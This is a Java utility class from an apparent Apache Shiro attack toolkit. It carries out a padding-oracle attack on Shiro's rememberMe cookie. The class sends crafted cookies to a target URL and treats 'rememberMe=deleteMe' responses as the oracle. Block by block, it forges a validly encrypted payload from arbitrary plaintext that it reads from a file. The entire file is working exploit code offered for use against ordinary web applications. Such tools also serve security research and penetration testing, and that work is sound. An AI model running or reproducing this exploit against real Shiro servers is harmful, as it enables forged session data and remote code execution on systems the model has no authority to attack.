package com.anbai.shiro.attack.utils;

import org.apache.http.Header;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;

/**
 * @author su18
 */
public class Poracle {

	private byte[] plainText;

	private int    blockSize;

	private int    encryptBlockCount;

	private String url;

	private String loginRememberMe;

	private int    requestCount;

	public Poracle(byte[] plainText, int blockSize, String url, String loginRememberMe) throws IOException {
		this.blockSize = blockSize;
		this.plainText = this.paddingData(plainText);
		this.url = url;
		this.loginRememberMe = loginRememberMe;
		this.requestCount = 0;
	}

	public byte[] getPlainText() {
		return this.plainText;
	}

	private byte[] paddingData(byte[] data) throws IOException {
		int paddingLength = this.blockSize - (data.length % this.blockSize);

		//计算要填充哪一个字节
		byte   paddingByte  = (byte) paddingLength;
		byte[] paddingBytes = new byte[paddingLength];
		Arrays.fill(paddingBytes, paddingByte);

		return ArrayUtil.mergerArray(data, paddingBytes);
	}

	private byte[] getBlockEncrypt(byte[] PlainTextBlock, byte[] nextCipherTextBlock) throws Exception {
		byte[] tmpIV   = new byte[this.blockSize];
		byte[] encrypt = new byte[this.blockSize];
		Arrays.fill(tmpIV, (byte) 0);

		for (int index = this.blockSize - 1; index >= 0; index--) {
			tmpIV[index] = this.findCharacterEncrypt(index, tmpIV, nextCipherTextBlock);
			System.out.println((String.format("Current string => %s, the %d block", ArrayUtil.bytesToHex(ArrayUtil.mergerArray(tmpIV, nextCipherTextBlock)), this.encryptBlockCount)));
		}

		for (int index = 0; index < this.blockSize; index++) {
			encrypt[index] = (byte) (tmpIV[index] ^ PlainTextBlock[index]);
		}
		return encrypt;
	}

	private boolean checkPaddingAttackRequest(String rememberMe) throws IOException {
		CloseableHttpClient   httpClient = HttpClients.createDefault();
		HttpGet               httpGet    = new HttpGet(this.url);
		CloseableHttpResponse response   = null;
		boolean               success    = true;

		httpGet.addHeader("User-Agent", "Mozilla/5.0");
		httpGet.addHeader("Referer", this.url);
		httpGet.addHeader("Cookie", String.format("rememberMe=%s", rememberMe));

		try {
			response = httpClient.execute(httpGet);
			this.requestCount += 1;
			Header[] headers = response.getAllHeaders();
			if (response.getStatusLine().getStatusCode() == 200) {
				for (Header header : headers) {
					if (header.getName().equals("Set-Cookie") && header.getValue().contains("rememberMe=deleteMe"))
						success = false;
				}
			}
		} catch (IOException e) {
			System.out.println("Request error when checkPaddingAttackRequest:" + e);
		} finally {
			if (response != null) response.close();
			httpClient.close();
		}
		return success;
	}

	private byte findCharacterEncrypt(int index, byte[] tmpIV, byte[] nextCipherTextBlock) throws Exception {
		if (nextCipherTextBlock.length != this.blockSize) {
			throw new Exception("CipherTextBlock size error!!!");
		}

		byte   paddingByte = (byte) (this.blockSize - index);
		byte[] preBLock    = new byte[this.blockSize];
		Arrays.fill(preBLock, (byte) 0);

		for (int ix = index; ix < this.blockSize; ix++) {
			preBLock[ix] = (byte) (paddingByte ^ tmpIV[ix]);
		}

		for (int c = 0; c < 256; c++) {
			//nextCipherTextBlock[index] < 256，那么在这个循环结果中构成的结果还是range(1,256)
			//所以下面两种写法都是正确的，当时看到原作者使用的是第一种方式有点迷，测试了下都可以
//            preBLock[index] = (byte) (paddingByte ^ nextCipherTextBlock[index] ^ c);
			preBLock[index] = (byte) c;

			byte[] tmpBLock1 = Base64.getDecoder().decode(this.loginRememberMe);
			byte[] tmpBlock2 = ArrayUtil.mergerArray(preBLock, nextCipherTextBlock);
			byte[] tmpBlock3 = ArrayUtil.mergerArray(tmpBLock1, tmpBlock2);
			String remeberMe = Base64.getEncoder().encodeToString(tmpBlock3);
			if (this.checkPaddingAttackRequest(remeberMe)) {
				return (byte) (preBLock[index] ^ paddingByte);
			}
		}
		throw new Exception("Occurs errors when find encrypt character, could't find a suiteable Character!!!");
	}

	public String encrypt(byte[] nextBLock) throws Exception {
		System.out.println("Start encrypt data...");
		byte[][] plainTextBlocks = ArrayUtil.splitBytes(this.plainText, this.blockSize);

		if (nextBLock == null || nextBLock.length == 0 || nextBLock.length != this.blockSize) {
			System.out.println("You provide block's size is not equal blockSize,try to reset it...");
			nextBLock = new byte[this.blockSize];
		}
		byte randomByte = (byte) (new Random()).nextInt(127);
		Arrays.fill(nextBLock, randomByte);

		byte[]   result                 = nextBLock;
		byte[][] reverseplainTextBlocks = ArrayUtil.reverseTwoDimensionalBytesArray(plainTextBlocks);
		this.encryptBlockCount = reverseplainTextBlocks.length;
		System.out.println(String.format("Total %d blocks to encrypt", this.encryptBlockCount));

		for (byte[] plainTextBlock : reverseplainTextBlocks) {
			nextBLock = this.getBlockEncrypt(plainTextBlock, nextBLock);
			result = ArrayUtil.mergerArray(nextBLock, result);

			this.encryptBlockCount -= 1;
			System.out.println(String.format("Left %d blocks to encrypt", this.encryptBlockCount));
		}

		System.out.println(String.format("Generate payload success, send request count => %s", this.requestCount));

		return Base64.getEncoder().encodeToString(result);
	}

	public static byte[] getFileContent(String filePath) throws IOException {
		File file     = new File(filePath);
		long fileSize = file.length();
		if (fileSize > Integer.MAX_VALUE) {
			System.out.println("filSystem.e too big...");
			return null;
		}
		FileInputStream fi     = new FileInputStream(file);
		byte[]          buffer = new byte[(int) fileSize];
		int             offset = 0;
		int             numRead;
		while (offset < buffer.length
				&& (numRead = fi.read(buffer, offset, buffer.length - offset)) >= 0) {
			offset += numRead;
		}
		// 确保所有数据均被读取
		if (offset != buffer.length) {
			throw new IOException("Could not completely read file "
					+ file.getName());
		}
		fi.close();
		return buffer;
	}
}